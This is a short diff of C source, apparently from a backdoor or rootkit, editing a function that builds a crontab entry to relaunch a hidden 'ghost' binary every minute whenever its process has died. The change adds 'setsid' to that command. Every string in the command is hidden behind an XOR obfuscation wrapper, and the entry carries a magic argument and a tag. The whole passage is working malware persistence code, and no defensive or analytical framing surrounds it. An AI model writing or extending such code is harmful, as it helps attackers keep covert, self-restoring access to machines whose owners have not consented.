@@ -228,14 +228,13 @@ static void install_cron_resurrect()
      */
     char cmd[1024];
     snprintf(cmd, sizeof(cmd),
-        "%s%s%s%s%s%s%s %s %s%s",
+        "%s%s%s%s%s%s %s %s%s",
         XorString("(crontab -l 2>/dev/null; echo '* * * * * [ -x "),
         XorString(GHOST_PATH),
         XorString(" ] && ! kill -0 $(cat "),
         XorString(PID_FILE),
-        XorString(") 2>/dev/null && "),
+        XorString(") 2>/dev/null && setsid "),
         XorString(GHOST_PATH),
-        XorString(""),
         XorString(GHOST_MAGIC),
         XorString(" #XSH_CRON"),
         XorString("') | crontab -"));
